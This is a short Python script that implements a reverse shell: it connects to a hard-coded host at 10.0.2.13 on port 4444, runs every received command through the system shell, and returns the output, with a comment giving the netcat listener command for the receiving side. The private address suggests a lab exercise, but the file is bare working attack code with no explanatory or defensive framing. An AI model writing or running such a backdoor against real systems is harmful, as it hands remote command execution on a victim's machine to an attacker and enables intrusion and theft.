# nc -vv -l -p 4444

import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('10.0.2.13', 4444))

while True:
    command = connection.recv(1024).decode()
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()
